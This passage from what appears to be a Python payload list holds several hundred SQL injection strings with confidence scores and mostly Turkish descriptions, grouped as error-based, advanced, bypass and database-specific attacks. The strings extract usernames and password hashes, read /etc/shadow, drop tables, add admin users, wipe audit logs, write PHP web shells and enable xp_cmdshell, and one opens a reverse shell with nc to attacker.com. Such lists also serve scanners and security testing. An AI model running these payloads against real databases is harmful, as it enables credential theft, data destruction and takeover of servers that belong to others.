        {"payload": "' AND (SELECT CASE WHEN FOUND_ROWS()>=0 THEN SLEEP(1) ELSE 0 END)--", "guven": 0.65, "aciklama": "Found rows sleep"},

        # === ERROR BASED INJECTION (201-250) ===
        {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--", "guven": 0.95, "aciklama": "MySQL EXTRACTVALUE hata - versiyon"},
        {"payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "guven": 0.95, "aciklama": "MySQL FLOOR hata - versiyon"},
        {"payload": "' AND UPDATEXML(NULL,CONCAT(0x7e,(SELECT version()),0x7e),NULL)--", "guven": 0.95, "aciklama": "MySQL UPDATEXML hata - versiyon"},
        {"payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(user(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "guven": 0.95, "aciklama": "User FLOOR hata"},
        {"payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "guven": 0.95, "aciklama": "Database FLOOR hata"},
        {"payload": "' AND EXP(~(SELECT * FROM (SELECT version())a))--", "guven": 0.90, "aciklama": "MySQL EXP hata injection"},
        {"payload": "' AND CAST((SELECT version()) AS INT)--", "guven": 0.85, "aciklama": "CAST hata injection"},
        {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--", "guven": 0.95, "aciklama": "EXTRACTVALUE user hata"},
        {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--", "guven": 0.95, "aciklama": "EXTRACTVALUE database hata"},
        {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--", "guven": 0.95, "aciklama": "EXTRACTVALUE @@version hata"},
        {"payload": "' AND UPDATEXML(NULL,CONCAT(0x7e,(SELECT user()),0x7e),NULL)--", "guven": 0.95, "aciklama": "UPDATEXML user hata"},
        {"payload": "' AND UPDATEXML(NULL,CONCAT(0x7e,(SELECT database()),0x7e),NULL)--", "guven": 0.95, "aciklama": "UPDATEXML database hata"},
        {"payload": "' AND UPDATEXML(NULL,CONCAT(0x7e,(SELECT @@hostname),0x7e),NULL)--", "guven": 0.90, "aciklama": "UPDATEXML hostname hata"},
        {"payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "guven": 0.95, "aciklama": "@@version FLOOR hata"},
        {"payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@hostname,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "guven": 0.90, "aciklama": "@@hostname FLOOR hata"},
        {"payload": "' AND EXP(~(SELECT * FROM (SELECT user())a))--", "guven": 0.90, "aciklama": "EXP user hata"},
        {"payload": "' AND EXP(~(SELECT * FROM (SELECT database())a))--", "guven": 0.90, "aciklama": "EXP database hata"},
        {"payload": "' AND EXP(~(SELECT * FROM (SELECT @@datadir)a))--", "guven": 0.85, "aciklama": "EXP datadir hata"},
        {"payload": "' AND CAST((SELECT user()) AS SIGNED)--", "guven": 0.85, "aciklama": "CAST SIGNED user hata"},
        {"payload": "' AND CAST((SELECT database()) AS SIGNED)--", "guven": 0.85, "aciklama": "CAST SIGNED database hata"},
        {"payload": "' AND CONVERT(INT,(SELECT version()))--", "guven": 0.85, "aciklama": "CONVERT INT hata"},
        {"payload": "' AND CONVERT(INT,(SELECT user()))--", "guven": 0.85, "aciklama": "CONVERT INT user hata"},
        {"payload": "' AND 1/0--", "guven": 0.80, "aciklama": "Division by zero hata"},
        {"payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT schema_name FROM information_schema.schemata LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "guven": 0.90, "aciklama": "Schema name FLOOR hata"},
        {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1), 0x7e))--", "guven": 0.90, "aciklama": "Table name EXTRACTVALUE hata"},
        {"payload": "' AND UPDATEXML(NULL,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns LIMIT 1),0x7e),NULL)--", "guven": 0.90, "aciklama": "Column name UPDATEXML hata"},
        {"payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT username FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "guven": 0.95, "aciklama": "Username FLOOR hata"},
        {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1), 0x7e))--", "guven": 0.98, "aciklama": "Password EXTRACTVALUE hata"},
        {"payload": "' AND UPDATEXML(NULL,CONCAT(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 1),0x7e),NULL)--", "guven": 0.98, "aciklama": "Credentials UPDATEXML hata"},
        {"payload": "' AND EXP(~(SELECT * FROM (SELECT CONCAT(username,password) FROM users LIMIT 1)a))--", "guven": 0.95, "aciklama": "Credentials EXP hata"},
        {"payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(HEX(password),FLOOR(RAND(0)*2))x FROM users GROUP BY x LIMIT 1)a)--", "guven": 0.95, "aciklama": "HEX password FLOOR hata"},
        {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username) FROM users), 0x7e))--", "guven": 0.95, "aciklama": "All usernames EXTRACTVALUE"},
        {"payload": "' AND UPDATEXML(NULL,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),NULL)--", "guven": 0.90, "aciklama": "All tables UPDATEXML"},
        {"payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT COUNT(*) FROM users),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "guven": 0.85, "aciklama": "User count FLOOR hata"},
        {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, 'Users:', (SELECT COUNT(*) FROM users), 0x7e))--", "guven": 0.85, "aciklama": "User count EXTRACTVALUE"},
        {"payload": "' AND POLYGON((SELECT * FROM (SELECT version())a))--", "guven": 0.85, "aciklama": "POLYGON geometry hata"},
        {"payload": "' AND MULTIPOINT((SELECT * FROM (SELECT user())a))--", "guven": 0.85, "aciklama": "MULTIPOINT geometry hata"},
        {"payload": "' AND LINESTRING((SELECT * FROM (SELECT database())a))--", "guven": 0.85, "aciklama": "LINESTRING geometry hata"},
        {"payload": "' AND MULTIPOLYGON((SELECT * FROM (SELECT @@version)a))--", "guven": 0.85, "aciklama": "MULTIPOLYGON geometry hata"},
        {"payload": "' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT user())a))--", "guven": 0.85, "aciklama": "GEOMETRYCOLLECTION hata"},
        {"payload": "' AND (SELECT POW(999,999))--", "guven": 0.80, "aciklama": "POW overflow hata"},
        {"payload": "' AND (SELECT EXP(999))--", "guven": 0.80, "aciklama": "EXP overflow hata"},
        {"payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(FLOOR(RAND(0)*2),(SELECT CONCAT_WS(':',username,password) FROM users LIMIT 1))x FROM information_schema.tables GROUP BY x)a)--", "guven": 0.95, "aciklama": "Credentials CONCAT_WS FLOOR"},
        {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT password FROM users LIMIT 1),1,31), 0x7e))--", "guven": 0.90, "aciklama": "Password substring EXTRACTVALUE"},
        {"payload": "' AND UPDATEXML(NULL,CONCAT(0x7e,MID((SELECT GROUP_CONCAT(username,':',password) FROM users),1,31),0x7e),NULL)--", "guven": 0.95, "aciklama": "Credentials MID UPDATEXML"},
        {"payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(LEFT((SELECT password FROM users LIMIT 1),31),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "guven": 0.90, "aciklama": "Password LEFT FLOOR"},
        {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, RIGHT((SELECT password FROM users LIMIT 1),31), 0x7e))--", "guven": 0.90, "aciklama": "Password RIGHT EXTRACTVALUE"},
        {"payload": "' AND UPDATEXML(NULL,CONCAT(0x7e,REVERSE(SUBSTRING(REVERSE((SELECT password FROM users LIMIT 1)),1,31)),0x7e),NULL)--", "guven": 0.85, "aciklama": "Password REVERSE UPDATEXML"},
        {"payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT DISTINCT CONCAT(user,'@',host) FROM mysql.user LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "guven": 0.90, "aciklama": "MySQL users FLOOR"},
        {"payload": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT authentication_string FROM mysql.user WHERE user='root' LIMIT 1), 0x7e))--", "guven": 0.95, "aciklama": "Root password hash EXTRACTVALUE"},
        {"payload": "' AND UPDATEXML(NULL,CONCAT(0x7e,(SELECT plugin FROM mysql.user WHERE user='root' LIMIT 1),0x7e),NULL)--", "guven": 0.85, "aciklama": "Root auth plugin UPDATEXML"},
        {"payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT super_priv FROM mysql.user WHERE user='root' LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "guven": 0.85, "aciklama": "Root super privilege FLOOR"},

        # === ADVANCED TECHNIQUES (251-300) ===
        {"payload": "'; DROP TABLE users;--", "guven": 0.98, "aciklama": "Tablo silme saldırısı - Yıkıcı"},
        {"payload": "'; INSERT INTO users VALUES ('hacker','hashed_pass','admin');--", "guven": 0.98, "aciklama": "Yeni admin kullanıcı ekleme"},
        {"payload": "'; UPDATE users SET password='$2y$10$hacked' WHERE username='admin';--", "guven": 0.98, "aciklama": "Admin şifre değiştirme"},
        {"payload": "'; DELETE FROM users WHERE username<>'admin';--", "guven": 0.98, "aciklama": "Admin hariç kullanıcı silme"},
        {"payload": "' OR 1 GROUP BY CONCAT(username,password) HAVING 1=1--", "guven": 0.90, "aciklama": "GROUP BY credentials saldırısı"},
        {"payload": "' AND (SELECT LOAD_FILE('/etc/passwd'))--", "guven": 0.95, "aciklama": "Linux passwd dosyası okuma"},
        {"payload": "' AND (SELECT LOAD_FILE('/etc/shadow'))--", "guven": 0.95, "aciklama": "Linux shadow dosyası okuma"},
        {"payload": "' AND (SELECT LOAD_FILE('/var/log/apache2/access.log'))--", "guven": 0.90, "aciklama": "Apache log dosyası okuma"},
        {"payload": "' AND (SELECT LOAD_FILE('/var/log/mysql/error.log'))--", "guven": 0.85, "aciklama": "MySQL hata log dosyası"},
        {"payload": "' AND (SELECT LOAD_FILE('/proc/version'))--", "guven": 0.85, "aciklama": "Sistem versiyon bilgisi"},
        {"payload": "'; CREATE TABLE backdoor (id INT, cmd TEXT);--", "guven": 0.98, "aciklama": "Backdoor tablosu oluşturma"},
        {"payload": "'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255) DEFAULT 'pwned';--", "guven": 0.95, "aciklama": "Backdoor kolonu ekleme"},
        {"payload": "' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php system($_GET[\"cmd\"]); ?>'--", "guven": 0.98, "aciklama": "Web shell yazma saldırısı"},
        {"payload": "'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' IDENTIFIED BY 'password';--", "guven": 0.98, "aciklama": "Yeni süper kullanıcı oluşturma"},
        {"payload": "' UNION SELECT '<?php eval($_POST[\"code\"]); ?>' INTO OUTFILE '/var/www/html/backdoor.php'--", "guven": 0.98, "aciklama": "PHP backdoor yazma"},
        {"payload": "'; CREATE FUNCTION sys_exec RETURNS STRING SONAME 'lib_mysqludf_sys.so';--", "guven": 0.95, "aciklama": "MySQL UDF fonksiyon oluşturma"},
        {"payload": "'; INSERT INTO mysql.func VALUES ('sys_exec','function','lib_mysqludf_sys.so',1);--", "guven": 0.95, "aciklama": "UDF fonksiyon kaydetme"},
        {"payload": "' UNION SELECT sys_exec('whoami'),NULL--", "guven": 0.95, "aciklama": "Sistem komutu çalıştırma"},
        {"payload": "'; CALL sys_eval('nc -e /bin/sh attacker.com 4444');--", "guven": 0.98, "aciklama": "Reverse shell çalıştırma"},
        {"payload": "' AND (SELECT * INTO OUTFILE '/tmp/mysql_dump.sql' FROM users)--", "guven": 0.95, "aciklama": "Kullanıcı verilerini dosyaya yazma"},
        {"payload": "'; LOAD DATA INFILE '/etc/passwd' INTO TABLE temp_table;--", "guven": 0.95, "aciklama": "Sistem dosyasını tabloya yükleme"},
        {"payload": "' UNION SELECT 1,2,3,4,5,6,LOAD_FILE('/etc/hosts'),8--", "guven": 0.90, "aciklama": "Hosts dosyası UNION ile okuma"},
        {"payload": "'; CREATE TEMPORARY TABLE temp AS SELECT * FROM users;--", "guven": 0.90, "aciklama": "Geçici tablo oluşturma"},
        {"payload": "'; RENAME TABLE users TO users_backup, temp TO users;--", "guven": 0.95, "aciklama": "Tablo değiştirme saldırısı"},
        {"payload": "'; TRUNCATE TABLE audit_logs;--", "guven": 0.95, "aciklama": "Audit log temizleme"},
        {"payload": "' AND (SELECT * FROM users PROCEDURE ANALYSE())--", "guven": 0.85, "aciklama": "PROCEDURE ANALYSE bilgi toplama"},
        {"payload": "'; SET @sql = CONCAT('SELECT * FROM ', database(), '.users'); PREPARE stmt FROM @sql; EXECUTE stmt;--", "guven": 0.90, "aciklama": "Prepared statement injection"},
        {"payload": "' AND ROW(1,1) > (SELECT COUNT(*), COUNT(*) FROM (SELECT 1 UNION SELECT 2) t GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)))--", "guven": 0.85, "aciklama": "ROW subquery error"},
        {"payload": "'; HANDLER users OPEN; HANDLER users READ FIRST;--", "guven": 0.90, "aciklama": "HANDLER table bypass"},
        {"payload": "' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)--", "guven": 0.85, "aciklama": "NAME_CONST error injection"},
        {"payload": "'; SELECT * FROM users WHERE 1=1 INTO DUMPFILE '/var/www/users.txt';--", "guven": 0.95, "aciklama": "DUMPFILE ile veri çıkarma"},
        {"payload": "' UNION SELECT 1,2,3 FROM (SELECT COUNT(*),CONCAT(FLOOR(RAND(0)*2),(SELECT HEX(password) FROM users LIMIT 1))a FROM information_schema.tables GROUP BY a)b--", "guven": 0.90, "aciklama": "Nested subquery password extraction"},
        {"payload": "'; SET @a = 0x73656c656374202a2066726f6d2075736572733b; PREPARE stmt FROM @a; EXECUTE stmt;--", "guven": 0.95, "aciklama": "Hex encoded query execution"},
        {"payload": "' AND (SELECT CASE WHEN (1=1) THEN (SELECT table_name FROM information_schema.tables) ELSE 1 END)--", "guven": 0.80, "aciklama": "CASE subquery error"},
        {"payload": "'; DECLARE @cmd VARCHAR(8000); SET @cmd = 'net user hacker password123 /add'; EXEC master..xp_cmdshell @cmd;--", "guven": 0.98, "aciklama": "Windows kullanıcı ekleme"},
        {"payload": "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--", "guven": 0.95, "aciklama": "xp_cmdshell aktifleştirme"},
        {"payload": "' AND (SELECT * FROM OPENROWSET('SQLOLEDB','Server=attacker.com;uid=sa;pwd=;','SELECT 1'))--", "guven": 0.90, "aciklama": "OPENROWSET remote bağlantı"},
        {"payload": "'; BULK INSERT temp_table FROM '\\\\attacker.com\\share\\data.txt';--", "guven": 0.90, "aciklama": "BULK INSERT remote dosya"},
        {"payload": "' UNION SELECT password,2 FROM (SELECT password FROM users ORDER BY id DESC LIMIT 1) t--", "guven": 0.90, "aciklama": "Son kullanıcı şifresi"},
        {"payload": "'; WITH RECURSIVE cte AS (SELECT 1 AS n UNION ALL SELECT n+1 FROM cte WHERE n<10000) SELECT * FROM cte,users;--", "guven": 0.85, "aciklama": "Recursive CTE DoS saldırısı"},
        {"payload": "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) t, (SELECT 1 UNION SELECT 2 UNION SELECT 3) t2, users)>1--", "guven": 0.80, "aciklama": "Cartesian product DoS"},
        {"payload": "'; DECLARE @xml XML; SET @xml = '<?xml version=\"1.0\"?><root><user>admin</user></root>'; SELECT @xml.value('(/root/user)[1]','VARCHAR(50)');--", "guven": 0.80, "aciklama": "XML data parsing"},
        {"payload": "' AND (SELECT TOP 1 name FROM master..sysobjects WHERE xtype='U')='users'--", "guven": 0.80, "aciklama": "SQL Server system objects"},
        {"payload": "'; SELECT * FROM users FOR XML AUTO;--", "guven": 0.85, "aciklama": "XML format data extraction"},
        {"payload": "' UNION SELECT CHAR(95)+CHAR(95)+CHAR(95)+CHAR(80)+CHAR(65)+CHAR(87)+CHAR(78)+CHAR(69)+CHAR(68)+CHAR(95)+CHAR(95)+CHAR(95)--", "guven": 0.85, "aciklama": "CHAR concatenation bypass"},
        {"payload": "'; WAITFOR TIME '23:59:59';--", "guven": 0.90, "aciklama": "Belirli zamana kadar bekleme"},
        {"payload": "' AND (SELECT COALESCE(NULL,NULL,NULL,version()))--", "guven": 0.75, "aciklama": "COALESCE function bypass"},
        {"payload": "' UNION SELECT NULLIF(1,2),version()--", "guven": 0.75, "aciklama": "NULLIF function bypass"},
        {"payload": "'; BEGIN TRANSACTION; UPDATE users SET password='hacked'; ROLLBACK;--", "guven": 0.90, "aciklama": "Transaction test injection"},
        {"payload": "' AND (SELECT * FROM users TABLESAMPLE (10 PERCENT))--", "guven": 0.75, "aciklama": "Random sample data extraction"},

        # === BYPASS TECHNIQUES (301-350) ===
        {"payload": "' OR 1=1/**/--", "guven": 0.90, "aciklama": "Comment bypass tekniği"},
        {"payload": "' OR/**/1=1--", "guven": 0.90, "aciklama": "Keyword arası comment"},
        {"payload": "' OR(1)=(1)--", "guven": 0.90, "aciklama": "Parantez ile bypass"},
        {"payload": "' OR 1=1%23", "guven": 0.90, "aciklama": "URL encoded comment"},
        {"payload": "' OR 1=1%2D%2D", "guven": 0.85, "aciklama": "URL encoded double dash"},
        {"payload": "' OR 1=1;%00", "guven": 0.85, "aciklama": "Null byte termination"},
        {"payload": "' OR 1=1\x00--", "guven": 0.85, "aciklama": "Hex null byte"},
        {"payload": "' OR 1 LIKE 1--", "guven": 0.85, "aciklama": "LIKE operatör bypass"},
        {"payload": "' OR 1 RLIKE 1--", "guven": 0.80, "aciklama": "RLIKE operatör bypass"},
        {"payload": "' OR 1 REGEXP 1--", "guven": 0.80, "aciklama": "REGEXP operatör bypass"},
        {"payload": "' OR 'a' SOUNDS LIKE 'a'--", "guven": 0.75, "aciklama": "SOUNDS LIKE bypass"},
        {"payload": "' OR 1=1 AND 'a'='a'--", "guven": 0.85, "aciklama": "Double true condition"},
        {"payload": "' OR 1=1 OR 'a'='a'--", "guven": 0.85, "aciklama": "Multiple OR conditions"},
        {"payload": "' OR 1=1 XOR false--", "guven": 0.80, "aciklama": "XOR logical operator"},
        {"payload": "' OR 1 DIV 1=1--", "guven": 0.80, "aciklama": "DIV operator bypass"},
        {"payload": "' OR 1 MOD 2<>2--", "guven": 0.75, "aciklama": "MOD operator bypass"},
        {"payload": "' OR POW(1,1)=1--", "guven": 0.75, "aciklama": "POW function bypass"},
        {"payload": "' OR SQRT(1)=1--", "guven": 0.75, "aciklama": "SQRT function bypass"},
        {"payload": "' OR EXP(0)=1--", "guven": 0.75, "aciklama": "EXP function bypass"},
        {"payload": "' OR LOG(1,1) IS NOT NULL--", "guven": 0.75, "aciklama": "LOG function bypass"},
        {"payload": "' OR SIN(0)=0--", "guven": 0.70, "aciklama": "SIN trigonometric bypass"},
        {"payload": "' OR COS(0)=1--", "guven": 0.70, "aciklama": "COS trigonometric bypass"},
        {"payload": "' OR TAN(0)=0--", "guven": 0.70, "aciklama": "TAN trigonometric bypass"},
        {"payload": "' OR 1 BETWEEN 1 AND 1--", "guven": 0.80, "aciklama": "BETWEEN range bypass"},
        {"payload": "' OR 1 NOT BETWEEN 2 AND 3--", "guven": 0.80, "aciklama": "NOT BETWEEN bypass"},
        {"payload": "' OR 1 IN(1,2,3)--", "guven": 0.85, "aciklama": "IN list bypass"},
        {"payload": "' OR 1 NOT IN(2,3,4)--", "guven": 0.80, "aciklama": "NOT IN bypass"},
        {"payload": "' OR EXISTS(SELECT 1)--", "guven": 0.85, "aciklama": "EXISTS subquery bypass"},
        {"payload": "' OR NOT EXISTS(SELECT 1 WHERE 1=2)--", "guven": 0.80, "aciklama": "NOT EXISTS bypass"},
        {"payload": "' OR ALL(SELECT 1)=1--", "guven": 0.75, "aciklama": "ALL quantifier bypass"},
        {"payload": "' OR ANY(SELECT 1)=1--", "guven": 0.75, "aciklama": "ANY quantifier bypass"},
        {"payload": "' OR SOME(SELECT 1)=1--", "guven": 0.75, "aciklama": "SOME quantifier bypass"},
        {"payload": "' OR 1=1 LIMIT 1--", "guven": 0.80, "aciklama": "LIMIT clause bypass"},
        {"payload": "' OR 1=1 ORDER BY 1--", "guven": 0.80, "aciklama": "ORDER BY bypass"},
        {"payload": "' OR 1=1 GROUP BY 1--", "guven": 0.75, "aciklama": "GROUP BY bypass"},
        {"payload": "' OR 1=1 HAVING 1=1--", "guven": 0.75, "aciklama": "HAVING clause bypass"},
        {"payload": "' OR 1=1 UNION ALL SELECT 1--", "guven": 0.85, "aciklama": "UNION ALL bypass"},
        {"payload": "' OR 1=1 INTERSECT SELECT 1--", "guven": 0.70, "aciklama": "INTERSECT set operation"},
        {"payload": "' OR 1=1 EXCEPT SELECT 2--", "guven": 0.70, "aciklama": "EXCEPT set operation"},
        {"payload": "' OR CASE WHEN 1=1 THEN 1 ELSE 0 END=1--", "guven": 0.80, "aciklama": "CASE expression bypass"},
        {"payload": "' OR IF(1=1,1,0)=1--", "guven": 0.85, "aciklama": "IF function bypass"},
        {"payload": "' OR IFNULL(1,0)=1--", "guven": 0.80, "aciklama": "IFNULL function bypass"},
        {"payload": "' OR ISNULL(NULL,1)=1--", "guven": 0.80, "aciklama": "ISNULL function bypass"},
        {"payload": "' OR COALESCE(NULL,1)=1--", "guven": 0.80, "aciklama": "COALESCE function bypass"},
        {"payload": "' OR NULLIF(1,2)=1--", "guven": 0.75, "aciklama": "NULLIF function bypass"},
        {"payload": "' OR GREATEST(1,0)=1--", "guven": 0.75, "aciklama": "GREATEST function bypass"},
        {"payload": "' OR LEAST(1,2)=1--", "guven": 0.75, "aciklama": "LEAST function bypass"},
        {"payload": "' OR 1=1 WINDOW w AS (ORDER BY 1)--", "guven": 0.70, "aciklama": "WINDOW function bypass"},
        {"payload": "' OR ROW_NUMBER() OVER()>=1--", "guven": 0.70, "aciklama": "ROW_NUMBER window function"},
        {"payload": "' OR RANK() OVER(ORDER BY 1)>=1--", "guven": 0.70, "aciklama": "RANK window function"},
        {"payload": "' OR DENSE_RANK() OVER(ORDER BY 1)>=1--", "guven": 0.70, "aciklama": "DENSE_RANK window function"},

        # === DATABASE SPECIFIC PAYLOADS (351-400) ===
        # MySQL Specific
        {"payload": "' OR @@version LIKE '%MySQL%'--", "guven": 0.90, "aciklama": "MySQL version detection"},
        {"payload": "' UNION SELECT @@version_comment,@@version_compile_os--", "guven": 0.90, "aciklama": "MySQL compile info"},
        {"payload": "' AND (SELECT COUNT(*) FROM mysql.user)>0--", "guven": 0.95, "aciklama": "MySQL user table access"},
        {"payload": "' UNION SELECT user,authentication_string FROM mysql.user--", "guven": 0.98, "aciklama": "MySQL users and hashes"},
        {"payload": "' UNION SELECT host,user FROM mysql.user WHERE super_priv='Y'--", "guven": 0.95, "aciklama": "MySQL super users"},
        {"payload": "' AND (SELECT @@global.read_only)=0--", "guven": 0.85, "aciklama": "MySQL read-only check"},
        {"payload": "' UNION SELECT @@global.datadir,@@global.tmpdir--", "guven": 0.85, "aciklama": "MySQL directory paths"},
        {"payload": "' AND (SELECT @@global.secure_file_priv) IS NULL--", "guven": 0.80, "aciklama": "MySQL secure file privileges"},
        {"payload": "' UNION SELECT @@global.log_bin,@@global.binlog_format--", "guven": 0.75, "aciklama": "MySQL binary logging"},
        {"payload": "' AND SUBSTRING_INDEX(@@version,'.',1)>=5--", "guven": 0.80, "aciklama": "MySQL major version check"},
        
        # PostgreSQL Specific
        {"payload": "' AND version() LIKE '%PostgreSQL%'--", "guven": 0.90, "aciklama": "PostgreSQL version detection"},
        {"payload": "' UNION SELECT current_user,session_user--", "guven": 0.90, "aciklama": "PostgreSQL user context"},
        {"payload": "' UNION SELECT current_database(),current_schema()--", "guven": 0.90, "aciklama": "PostgreSQL database/schema"},
        {"payload": "' AND (SELECT COUNT(*) FROM pg_user)>0--", "guven": 0.95, "aciklama": "PostgreSQL user table"},
        {"payload": "' UNION SELECT usename,passwd FROM pg_shadow--", "guven": 0.98, "aciklama": "PostgreSQL user passwords"},
        {"payload": "' AND (SELECT usesuper FROM pg_user WHERE usename=user())='t'--", "guven": 0.90, "aciklama": "PostgreSQL superuser check"},
        {"payload": "' UNION SELECT inet_client_addr(),inet_server_addr()--", "guven": 0.85, "aciklama": "PostgreSQL network info"},
        {"payload": "' AND (SELECT setting FROM pg_settings WHERE name='data_directory') LIKE '/var%'--", "guven": 0.80, "aciklama": "PostgreSQL data directory"},
        {"payload": "' UNION SELECT schemaname,tablename FROM pg_tables--", "guven": 0.85, "aciklama": "PostgreSQL tables"},
        {"payload": "' AND (SELECT COUNT(*) FROM pg_proc WHERE proname='system')>0--", "guven": 0.85, "aciklama": "PostgreSQL system functions"},
        
        # SQL Server Specific  
        {"payload": "' AND @@version LIKE '%Microsoft%'--", "guven": 0.90, "aciklama": "SQL Server detection"},
        {"payload": "' UNION SELECT @@servername,@@servicename--", "guven": 0.90, "aciklama": "SQL Server instance info"},
        {"payload": "' AND (SELECT COUNT(*) FROM master.sys.syslogins)>0--", "guven": 0.95, "aciklama": "SQL Server logins table"},
        {"payload": "' UNION SELECT name,password_hash FROM sys.sql_logins--", "guven": 0.98, "aciklama": "SQL Server login hashes"},
        {"payload": "' AND (SELECT IS_SRVROLEMEMBER('sysadmin'))=1--", "guven": 0.95, "aciklama": "SQL Server sysadmin check"},
        {"payload": "' UNION SELECT @@datadir,@@errorlog--", "guven": 0.85, "aciklama": "SQL Server paths"},
        {"payload": "' AND (SELECT value FROM sys.configurations WHERE name='xp_cmdshell')=1--", "guven": 0.90, "aciklama": "xp_cmdshell status check"},
        {"payload": "' UNION SELECT DB_NAME(),SCHEMA_NAME()--", "guven": 0.85, "aciklama": "SQL Server database/schema"},
        {"payload": "' AND (SELECT HAS_DBACCESS(DB_NAME()))=1--", "guven": 0.80, "aciklama": "Database access check"},
        {"payload": "' UNION SELECT @@spid,@@rowcount--", "guven": 0.75, "aciklama": "SQL Server session info"},
        
        # Oracle Specific
        {"payload": "' AND (SELECT banner FROM v$version WHERE ROWNUM=1) LIKE '%Oracle%'--", "guven": 0.90, "aciklama": "Oracle version detection"},
        {"payload": "' UNION SELECT user,sys_context('userenv','session_user') FROM dual--", "guven": 0.90, "aciklama": "Oracle user context"},
        {"payload": "' AND (SELECT COUNT(*) FROM all_users)>0--", "guven": 0.95, "aciklama": "Oracle users table"},
        {"payload": "' UNION SELECT username,password FROM sys.user$--", "guven": 0.98, "aciklama": "Oracle user passwords"},
        {"payload": "' AND (SELECT sys_context('userenv','isdba') FROM dual)='TRUE'--", "guven": 0.95, "aciklama": "Oracle DBA check"},
        {"payload": "' UNION SELECT global_name,instance_name FROM global_name,v$instance--", "guven": 0.85, "aciklama": "Oracle instance info"},
        {"payload": "' AND (SELECT value FROM v$parameter WHERE name='utl_file_dir') IS NOT NULL--", "guven": 0.80, "aciklama": "Oracle file directory"},
        {"payload": "' UNION SELECT table_name,tablespace_name FROM user_tables WHERE ROWNUM<=5--", "guven": 0.85, "aciklama": "Oracle user tables"},
        {"payload": "' AND (SELECT granted_role FROM user_role_privs WHERE granted_role='DBA' AND ROWNUM=1)='DBA'--", "guven": 0.90, "aciklama": "Oracle DBA role check"},
        {"payload": "' UNION SELECT sid,serial# FROM v$session WHERE username=user--", "guven": 0.80, "aciklama": "Oracle session info"},
        
        # SQLite Specific
        {"payload": "' AND sqlite_version()>='3.0'--", "guven": 0.90, "aciklama": "SQLite version check"},
        {"payload": "' UNION SELECT name,sql FROM sqlite_master WHERE type='table'--", "guven": 0.95, "aciklama": "SQLite schema tables"},
        {"payload": "' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0--", "guven": 0.90, "aciklama": "SQLite table count"},
        {"payload": "' UNION SELECT tbl_name,sql FROM sqlite_master WHERE name='users'--", "guven": 0.90, "aciklama": "SQLite users table schema"},
        {"payload": "' AND (SELECT sql FROM sqlite_master WHERE name='sqlite_sequence') IS NOT NULL--", "guven": 0.80, "aciklama": "SQLite sequence table"},
        {"payload": "' UNION SELECT name,file FROM pragma_database_list()--", "guven": 0.85, "aciklama": "SQLite database files"},
        {"payload": "' AND (SELECT COUNT(*) FROM pragma_table_info('users'))>2--", "guven": 0.85, "aciklama": "SQLite table column count"},
        {"payload": "' UNION SELECT name,type FROM pragma_table_info('users')--", "guven": 0.85, "aciklama": "SQLite column info"},
        {"payload": "' AND (SELECT integrity_check FROM pragma_integrity_check()) LIKE 'ok'--", "guven": 0.75, "aciklama": "SQLite integrity check"},
        {"payload": "' UNION SELECT key,value FROM pragma_compile_options()--", "guven": 0.75, "aciklama": "SQLite compile options"},

        # === SECOND ORDER INJECTION (401-430) ===
